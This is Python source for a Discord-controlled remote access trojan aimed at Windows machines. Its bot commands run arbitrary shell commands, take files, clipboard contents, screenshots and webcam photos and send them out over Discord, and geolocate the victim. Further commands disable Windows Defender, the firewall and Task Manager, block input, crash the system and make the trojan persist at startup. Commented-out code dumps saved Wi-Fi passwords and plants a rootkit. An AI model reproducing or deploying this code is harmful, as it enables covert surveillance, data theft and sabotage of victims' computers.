# TXD - by benzoXdev
import discord
from discord.ext import commands
import subprocess
import pyautogui
import os
import ctypes
import win32clipboard
import requests
import shutil
import cv2
import psutil
import time
from PIL import ImageGrab
from datetime import datetime
import tkinter as tk
from tkinter import messagebox
import sys

bot_token = "{bot_token}"
server_id = "{server_id}"

# Intents required for the bot
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Check admin privileges
def is_admin():
    try:
        # Check if current process has elevated privileges
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        return False

# Bot connected successfully
@bot.event
async def on_ready():
    print(f'{bot.user} logged in successfully.')
    guild = discord.utils.get(bot.guilds, id=int(server_id))
    if guild:
        channel = discord.utils.get(guild.text_channels, name="session")
        if not channel:
            channel = await guild.create_text_channel("session")

        try:
            # Get public IP using ipify API
            ip_response = requests.get("https://api.ipify.org?format=json")
            ip_data = ip_response.json()
            ip_publica = ip_data.get("ip", "Could not get public IP")

            # Get geolocation
            geolocate_response = requests.get(f"http://ip-api.com/json/{ip_publica}")
            geolocate_data = geolocate_response.json()

            country_code = geolocate_data.get("countryCode", "").lower()
            country_flag = f":flag_{country_code}:"

            location_message = (
                f"**Login successful. Bot public IP:**\n"
                f"IP: `{ip_publica}`\n"
                f"Country: {geolocate_data.get('country', 'Unknown')} {country_flag}\n"
                f"City: {geolocate_data.get('city', 'Unknown')}\n"
                f"Latitude: {geolocate_data.get('lat', 'Unknown')}\n"
                f"Longitude: {geolocate_data.get('lon', 'Unknown')}"
            )

            # Send IP and geolocation to channel
            await channel.send(location_message)

        except Exception as e:
            await channel.send(f"**Error getting public IP or geolocation:**\n```{str(e)}```")

        # Show help menu
        await myhelp(channel)

# Help command
@bot.command(name="myhelp")
async def myhelp(ctx):
    help_text = (
        "**📝 Available Commands:**\n\n"
        
        "**General Commands:**\n\n"
        "--> `!message` = Show message box with your text / Syntax: `!message example`\n"
        "--> `!shell` = Execute shell command / Syntax: `!shell whoami`\n"
        "--> `!voice` = Text-to-speech / Syntax: `!voice test`\n"
        "--> `!admincheck` = Check if program has admin privileges\n"
        "--> `!cd` = Change directory\n"
        "--> `!dir` = List directory contents\n"
        "--> `!download` = Download file from target machine\n"
        "--> `!upload` = Upload file to target machine / Syntax: `!upload file.png` (with attachment)\n"
        "--> `!delete` = Delete a file / Syntax: `!delete /path/to/file.txt`\n"
        "--> `!write` = Write text to a file\n"
        "--> `!clipboard` = Get clipboard content from target machine\n"
        "--> `!idletime` = Get user idle time\n"
        "--> `!datetime` = Show current date and time\n"
        "--> `!currentdir` = Show current directory\n\n"
        
        "**Privilege Escalation & System Control:**\n\n"
        "--> `!getadmin` = Request admin privileges via UAC\n"
        "--> `!block` = Block keyboard and mouse (Admin required)\n"
        "--> `!unblock` = Unblock keyboard and mouse (Admin required)\n"
        "--> `!screenshot` = Take screenshot\n"
        "--> `!exit` = Exit program\n"
        "--> `!kill` = Kill session or process / Syntax: `!kill session-3` or `!kill all`\n"
        "--> `!uacbypass` = Attempt UAC bypass for admin privileges\n"
        "--> `!shutdown` = Shutdown computer\n"
        "--> `!restart` = Restart computer\n"
        "--> `!logoff` = Log off current user\n"
        "--> `!bluescreen` = Trigger blue screen (Admin required)\n"
        "--> `!migrateprocess <process_name>` = Migrate process to new instance / Syntax: `!migrateprocess example.exe`\n\n"
        
        "**Security & System Modifications:**\n\n"
        "--> `!prockill` = Kill process by name / Syntax: `!prockill process`\n"
        "--> `!disabledefender` = Disable Windows Defender (Admin required)\n"
        "--> `!disablefirewall` = Disable Windows Firewall (Admin required)\n"
        "--> `!critproc` = Make program a critical process (Admin required)\n"
        "--> `!uncritproc` = Remove critical process status (Admin required)\n"
        "--> `!website` = Open website on target / Syntax: `!website www.google.com`\n"
        "--> `!disabletaskmgr` = Disable Task Manager (Admin required)\n"
        "--> `!enabletaskmgr` = Enable Task Manager (Admin required)\n"
        "--> `!startup` = Add program to startup\n\n"
        
        "**Geolocation & Other:**\n\n"
        "--> `!geolocate` = Geolocate using IP lat/long\n"
        "--> `!listprocess` = List all processes\n"
        "--> `!infocounts` = Get system account info\n"
        "--> `!rootkit` = Launch rootkit (Admin required) [Not available]\n"
        "--> `!unrootkit` = Remove rootkit (Admin required) [Not available]\n"
        "--> `!getcams` = List camera names\n"
        "--> `!selectcam` = Select camera for photo / Syntax: `!selectcam 1`\n"
        "--> `!webcampic` = Take photo with selected webcam\n"
        "--> `!myhelp` = This help menu\n"
    )

    # Create temp file
    file_path = "help_commands.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(help_text)
    
    # Send text file to Discord
    await ctx.send("Here is the help file:", file=discord.File(file_path))
    
    # Delete temp file after sending
    os.remove(file_path)

# Request admin privileges and migrate process
@bot.command()
async def getadmin(ctx, process_name: str = None):
    if is_admin():
        await ctx.send("You already have admin privileges.")
    else:
        try:
            # Request admin privileges
            subprocess.run("""powershell -Command "Start-Process cmd -ArgumentList '/C echo Privileges granted' -Verb RunAs" """, shell=True)
            await ctx.send("Admin privileges obtained.")

            # If process name provided, migrate to new instance with elevated privileges
            if process_name:
                migrated_process = None
                for proc in psutil.process_iter(['pid', 'name']):
                    if process_name.lower() in proc.info['name'].lower():
                        migrated_process = proc
                        break

                if migrated_process is None:
                    await ctx.send(f"**Error:** No process found with name `{process_name}`.")
                    return
                
                # Get executable path of found process
                process_path = migrated_process.exe()

                # Run new process instance with elevated privileges
                subprocess.run(f"powershell -Command Start-Process '{process_path}' -Verb RunAs", shell=True)
                
                await ctx.send(f"**Success:** Process `{process_name}` migrated to new instance with elevated privileges.")
                
                # Terminate original process
                migrated_process.terminate()
                time.sleep(2)  # Wait for process to terminate
                
                await ctx.send(f"**Original process `{process_name}` has been closed and migrated.**")
            else:
                await ctx.send("No process name provided for migration.")

        except Exception as e:
            await ctx.send(f"**Error:** {str(e)}")

# Check admin privileges
@bot.command()
async def admincheck(ctx):
    if is_admin():
        await ctx.send("```Program has admin privileges.```")
    else:
        await ctx.send("```Program does NOT have admin privileges.```")

  # Command: Show message box
@bot.command()
async def message(ctx, *, text: str):
    pyautogui.alert(text)
    await ctx.send("```Message displayed on machine.```")

# Command: Execute shell command
@bot.command()
async def shell(ctx, *, command: str):
    await ctx.send(f"```yaml\nExecuting command: {command}\n```")
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        await ctx.send(f"```{result.stdout}```")
    else:
        await ctx.send(f"```Error:\n{result.stderr}```")

# Command: Text-to-speech
@bot.command()
async def voice(ctx, *, text: str):
    from pyttsx3 import init
    tts = init()
    tts.say(text)
    tts.runAndWait()
    await ctx.send("```Text read aloud.```")

# Command: Change directory
@bot.command()
async def cd(ctx, *, path: str):
    try:
        os.chdir(path)
        await ctx.send(f"```Directory changed to: {os.getcwd()}```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Command: List directory contents
@bot.command()
async def dir(ctx):
    try:
        items = os.listdir()
        await ctx.send(f"```{items}```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Command: Download file
@bot.command()
async def download(ctx, *, file_path: str):
    try:
        with open(file_path, "rb") as file:
            await ctx.send(file=discord.File(file, os.path.basename(file_path)))
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Command: Upload file with attachment
@bot.command()
async def upload(ctx):
    if ctx.message.attachments:
        for attachment in ctx.message.attachments:
            await attachment.save(attachment.filename)
        await ctx.send("```File(s) uploaded successfully.```")
    else:
        await ctx.send("```No file attached.```")

# Command: Capture clipboard
@bot.command()
async def clipboard(ctx):
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        await ctx.send(f"```{data}```")
    except Exception as e:
        await ctx.send(f"```Error reading clipboard: {str(e)}```")

# Command: Screenshot
@bot.command()
async def screenshot(ctx):
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        await ctx.send(file=discord.File("screenshot.png"))
        os.remove("screenshot.png")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Command: Block keyboard and mouse
@bot.command()
async def block(ctx):
    if not is_admin():
        await ctx.send("```Admin privileges required.```")
        return
    ctypes.windll.user32.BlockInput(True)
    await ctx.send("```Keyboard and mouse locked.```")

# Command: Unblock keyboard and mouse
@bot.command()
async def unblock(ctx):
    if not is_admin():
        await ctx.send("```Admin privileges required.```")
        return
    ctypes.windll.user32.BlockInput(False)
    await ctx.send("```Keyboard and mouse unlocked.```")

# Command: Get idle time
@bot.command()
async def idletime(ctx):
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
        seconds = millis // 1000
        await ctx.send(f"```Tiempo de inactividad: {seconds} segundos.```")
    else:
        await ctx.send("```Error getting idle time.```")

# Command: Kill process by name
@bot.command()
async def prockill(ctx, *, process_name: str):
    try:
        result = subprocess.run(f"taskkill /IM {process_name} /F", shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            await ctx.send(f"```Process {process_name} terminated successfully.```")
        else:
            await ctx.send(f"```Error terminating process: {result.stderr}```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Command: Disable Defender
@bot.command()
async def disabledefender(ctx):
    if not is_admin():
        await ctx.send("```Admin privileges required.```")
        return
    try:
        # Run command in PowerShell with elevated privileges
        subprocess.run("""powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" """, shell=True)
        await ctx.send("```Windows Defender deshabilitado.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Command: Disable Firewall
@bot.command()
async def disablefirewall(ctx):
    if not is_admin():
        await ctx.send("```Admin privileges required.```")
        return
    try:
        # Run command in PowerShell with elevated privileges
        subprocess.run("""powershell -Command "netsh advfirewall set allprofiles state off" """, shell=True)
        await ctx.send("```Firewall deshabilitado.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Command: Get process list and send as .txt file
@bot.command()
async def listprocess(ctx):
    try:
        # Run tasklist command
        result = subprocess.run("tasklist", shell=True, capture_output=True, text=True)
        
        # Create temp text file
        file_path = "text_listprocess.txt"
        with open(file_path, "w", encoding="utf-8") as f:
            # Write tasklist output to file
            f.write(result.stdout)
        
        # Send text file to Discord
        await ctx.send("Here is the list of active processes:", file=discord.File(file_path))
        
        # Delete temp file after sending
        os.remove(file_path)
    
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")
        
# Command: Show current date and time
@bot.command()
async def current_time(ctx):
    now = datetime.datetime.now()
    await ctx.send(f"La hora actual es: {now.strftime('%Y-%m-%d %H:%M:%S')}")

# Command: Shutdown system
@bot.command()
async def shutdown(ctx):
    if not is_admin():
        await ctx.send("```Admin privileges required.```")
        return
    subprocess.run("shutdown /s /t 1", shell=True)
    await ctx.send("```System shutting down...```")

# Command: Restart system
@bot.command()
async def restart(ctx):
    if not is_admin():
        await ctx.send("```Admin privileges required.```")
        return
    subprocess.run("shutdown /r /t 1", shell=True)
    await ctx.send("```System restarting...```")

# Command: Log off
@bot.command()
async def logoff(ctx):
    if not is_admin():
        await ctx.send("```Admin privileges required.```")
        return
    subprocess.run("shutdown /l", shell=True)
    await ctx.send("```Logging off...```")

# Command: Blue screen
@bot.command()
async def bluescreen(ctx):
    """Attempt to generate BSOD by terminating svchost.exe"""
    
    try:
        # Send notification message
        await ctx.send("Intentando generar Pantallazo Azul (BSOD)...")

        # Run taskkill command
        subprocess.run("taskkill /IM svchost.exe /F", shell=True, check=True)

        # Confirm command was executed
        await ctx.send("Command executed. If the system allows it, a BSOD may occur.")

    except Exception as e:
        # If error occurs
        await ctx.send(f"Error executing command: {e}")

# Command: Disable Task Manager
@bot.command()
async def disabletaskmgr(ctx):
    if not is_admin():
        await ctx.send("```Admin privileges required.```")
        return
    try:
        subprocess.run("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskmgr /t REG_DWORD /d 1 /f", shell=True)
        await ctx.send("```Administrador de Tareas deshabilitado.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Command: Enable Task Manager
@bot.command()
async def enabletaskmgr(ctx):
    if not is_admin():
        await ctx.send("```Admin privileges required.```")
        return
    try:
        subprocess.run("REG DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskmgr /f", shell=True)
        await ctx.send("```Administrador de Tareas habilitado.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Command: Change current directory
@bot.command()
async def currentdir(ctx):
    try:
        current_dir = os.getcwd()
        await ctx.send(f"```Current directory: {current_dir}```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Command: Open web page
@bot.command()
async def website(ctx, url: str):
    try:
        subprocess.run(f"start {url}", shell=True)
        await ctx.send(f"```Website {url} opened in default browser.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Command: Exit program
@bot.command()
async def exit(ctx):
    await ctx.send("```Closing bot...```")
    await bot.close()

# Command: Make program critical
@bot.command()
async def critproc(ctx):
    if not is_admin():
        await ctx.send("```Admin privileges required.```")
        return
    ctypes.windll.ntdll.RtlSetProcessIsCritical(True, False, False)
    await ctx.send("```Program is now a critical process.```")

# Command: Remove critical process status
@bot.command()
async def uncritproc(ctx):
    if not is_admin():
        await ctx.send("```Admin privileges required.```")
        return
    ctypes.windll.ntdll.RtlSetProcessIsCritical(False, False, False)
    await ctx.send("```Program is no longer a critical process.```")

# Command: Take screenshot
@bot.command(name="takescreenshot")
async def takescreenshot(ctx):
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        await ctx.send(file=discord.File("screenshot.png"))
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Command: Block keyboard and mouse (admin required)
@bot.command(name="blockkeyboard")
async def blockkeyboard(ctx):
    if not is_admin():
        await ctx.send("```Admin privileges required.```")
        return
    try:
        subprocess.run("RUNDLL32 user32.dll,LockWorkStation", shell=True)
        await ctx.send("```Keyboard and mouse locked.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Command: Copy clipboard content
@bot.command(name="copyclipboard")
async def copyclipboard(ctx):
    try:
        # Leer el contenido del portapapeles
        import pyperclip
        clipboard_content = pyperclip.paste()
        await ctx.send(f"```Clipboard content: {clipboard_content}```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Command: Upload file to target (with attachment)
@bot.command(name="uploadFile")
async def uploadFile(ctx):
    if ctx.message.attachments:
        for attachment in ctx.message.attachments:
            await attachment.save(attachment.filename)
            await ctx.send(f"```File {attachment.filename} uploaded successfully.```")
    else:
        await ctx.send("```No file attached.```")

# Command: Attempt UAC bypass
@bot.command()
async def uacbypass(ctx):
    if not is_admin():
        await ctx.send("```Admin privileges required.```")
        return
    try:
        subprocess.run("start %windir%\\System32\\slui.exe", shell=True)
        await ctx.send("```Intentando bypass UAC...```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

# Coamndo: Geolocaliza la IP publica del host
@bot.command()
async def geolocate(ctx, ip_address: str = None):
    try:
        # If no IP provided, get public IP automatically
        if ip_address is None:
            ip_response = requests.get("https://api.ipify.org?format=json")
            ip_data = ip_response.json()
            ip_address = ip_data.get("ip")
        
        # Get geolocation using IP
        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        location_data = response.json()

        # If response contains error, show message
        if location_data.get("status") == "fail":
            await ctx.send(f"Error getting geolocation for IP: {ip_address}")
            return

        # Get country flag from country code
        country_code = location_data['countryCode']
        # Use flag emote from country code
        country_flag = f":flag_{country_code.lower()}:"

        # Create geolocation message
        location_message = (
            f"**Location of {ip_address}:**\n"
            f"City: {location_data['city']}\n"
            f"Country: {location_data['country']} {country_flag}\n"
            f"Latitude: {location_data['lat']}\n"
            f"Longitude: {location_data['lon']}"
        )

        # Send geolocation message
        await ctx.send(location_message)

    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

# Command: Kill session
@bot.command()
async def kill(ctx, session_name: str):
    try:
        if session_name == "all":
            subprocess.run("taskkill /F /IM python.exe", shell=True)
            await ctx.send("```All sessions have been terminated.```")
        else:
            subprocess.run(f"taskkill /F /IM {session_name}.exe", shell=True)
            await ctx.send(f"```Session {session_name} terminated.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def delete(ctx, file_path: str):
    try:
        # Check if file exists
        if os.path.exists(file_path):
            os.remove(file_path)  # Delete file
            await ctx.send(f"File `{file_path}` deleted successfully.")
        else:
            await ctx.send(f"File `{file_path}` not found.")
    except Exception as e:
        await ctx.send(f"Error deleting file: {str(e)}")

@bot.command()
async def write(ctx, file_path: str, *, text: str):
    try:
        # Open file in write mode (creates if not exists)
        with open(file_path, "w") as file:
            file.write(text)  # Write text to file
        await ctx.send(f"Text written successfully to `{file_path}`.")
    except Exception as e:
        await ctx.send(f"Error writing to file: {str(e)}")

@bot.command()
async def startup(ctx, program_path: str):
    try:
        # Check if program file exists
        if not os.path.exists(program_path):
            await ctx.send(f"El programa en `{program_path}` no se encuentra.")
            return
        
        # Get user startup folder (Windows)
        startup_folder = os.getenv('APPDATA') + r'\Microsoft\Windows\Start Menu\Programs\Startup'
        
        # Check if startup folder exists
        if not os.path.exists(startup_folder):
            await ctx.send("Could not find startup folder.")
            return
        
        # Create program shortcut in startup folder
        program_name = os.path.basename(program_path)
        startup_program_path = os.path.join(startup_folder, program_name)
        
        # Copy file to startup directory
        shutil.copy(program_path, startup_program_path)
        
        await ctx.send(f"El programa `{program_name}` se ha agregado al inicio correctamente.")
    except Exception as e:
        await ctx.send(f"Error adding program to startup: {str(e)}")

@bot.command()
async def getcams(ctx):
    try:
        # Get list of available cameras
        index = 0
        cams = []
        while True:
            cap = cv2.VideoCapture(index)
            if not cap.isOpened():
                break
            cams.append(f"Camara {index}")
            cap.release()
            index += 1
        
        if cams:
            await ctx.send(f"List of available cameras: {', '.join(cams)}")
        else:
            await ctx.send("No cameras found.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def selectcam(ctx, cam_number: int):
    try:
        cap = cv2.VideoCapture(cam_number)
        
        if not cap.isOpened():
            await ctx.send(f"Camera {cam_number} not found.")
            return
        
        ret, frame = cap.read()
        if ret:
            # Guardar la foto tomada en el disco
            cv2.imwrite("captured_image.jpg", frame)
            await ctx.send("Picture taken successfully!")
        else:
            await ctx.send("Failed to capture image.")
        cap.release()
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def webcampic(ctx):
    try:
        # Use camera 0 by default
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
            await ctx.send("No camera found.")
            return
        
        ret, frame = cap.read()
        if ret:
            # Guardar la foto tomada en el disco
            image_path = "webcam_picture.jpg"
            cv2.imwrite(image_path, frame)
            
            # Send image to Discord as attachment
            await ctx.send("Picture taken successfully!", file=discord.File(image_path))
        else:
            await ctx.send("Failed to capture image.")
        cap.release()
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

"""@bot.command()
async def rootkit(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please attach the .zip file to the message.")
        return

    zip_file = ctx.message.attachments[0].filename
    zip_file_url = ctx.message.attachments[0].url

    rootkit_folder = "rootkit"
    rootkit_path = os.path.join(os.path.expanduser("~"), rootkit_folder)
    if not os.path.exists(rootkit_path):
        os.makedirs(rootkit_path)

    def ignore_windows_defender(folder_path):
        def add_exclusion(exclusion):
            subprocess.run(["powershell", "-Command", f"Set-MpPreference -ExclusionPath {exclusion}"])

        rootkit_path = os.path.abspath(folder_path)
        add_exclusion(rootkit_path)
        for parent, _, files in os.walk(rootkit_path):
            for file in files:
                file_path = os.path.join(parent, file)
                add_exclusion(file_path)

    def download_zip(url, file_path):
        with requests.get(url, stream=True) as r:
            with open(file_path, "wb") as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)

    download_zip(zip_file_url, os.path.join(rootkit_path, zip_file))
    with zipfile.ZipFile(os.path.join(rootkit_path, zip_file), "r") as zip_ref:
        zip_ref.extractall(rootkit_path)
    await ctx.send("Rootkit creado con exito")"""

# Command: Migrate process to new instance
@bot.command()
async def migrateprocess(ctx, process_name: str):
    try:
        # Find all processes with given name
        migrated_process = None
        for proc in psutil.process_iter(['pid', 'name']):
            if process_name.lower() in proc.info['name'].lower():
                migrated_process = proc
                break

        if migrated_process is None:
            await ctx.send(f"**Error:** No process found with name `{process_name}`.")
            return
        
        # Get executable path of found process
        process_path = migrated_process.exe()
        
        # Run new process instance
        subprocess.Popen([process_path])
        await ctx.send(f"**Success:** Process `{process_name}` migrated to new instance.")
        
        # Terminate original process
        migrated_process.terminate()
        time.sleep(2)  # Wait for process to terminate
        
        await ctx.send(f"**Original process `{process_name}` has been closed and migrated.**")
    
    except Exception as e:
        await ctx.send(f"**Error:** {str(e)}")

"""# Command: Dump Wi-Fi passwords
@bot.command()
async def password(ctx):
    try:
        # Run PowerShell to get saved Wi-Fi networks and passwords
        result = subprocess.run(
            ["powershell.exe", "netsh wlan show profiles"],
            capture_output=True, text=True
        )
        
        # Extract Wi-Fi passwords
        wifi_profiles = result.stdout.splitlines()
        wifi_passwords = []
        
        for line in wifi_profiles:
            if "All User Profile" in line:
                profile_name = line.split(":")[1].strip()
                # Get password for each Wi-Fi network (if available)
                password_result = subprocess.run(
                    ["powershell.exe", f"netsh wlan show profile name=\"{profile_name}\" key=clear"],
                    capture_output=True, text=True
                )
                password_info = password_result.stdout
                for line in password_info.splitlines():
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        wifi_passwords.append(f"**{profile_name}**: {password}")
                        break
        
        if not wifi_passwords:
            await ctx.send("No saved Wi-Fi passwords found or no passwords available.")
        else:
            # Send found passwords to Discord channel
            await ctx.send(f"**Wi-Fi passwords found:**\n" + "\n".join(wifi_passwords))
    
    except Exception as e:
        await ctx.send(f"Error getting Wi-Fi passwords: {str(e)}")"""

# Command: Get NTLM hashes of user accounts
@bot.command()
async def infocounts(ctx):
    try:
        # Get NTLM hashes of user accounts
        # Use PowerShell Get-WmiObject for account details
        user_info_result = subprocess.run(
            ["powershell.exe", "Get-WmiObject -Class Win32_UserAccount | Select-Object Name, SID"],
            capture_output=True, text=True
        )
        
        # Display NTLM hashes for accounts
        user_info = user_info_result.stdout.strip()

        # Respuesta en Discord
        await ctx.send(f"**System account info:**\n{user_info}")
    
    except Exception as e:
        await ctx.send(f"**Error getting information:** {str(e)}")
          
# Run bot
bot.run(bot_token)
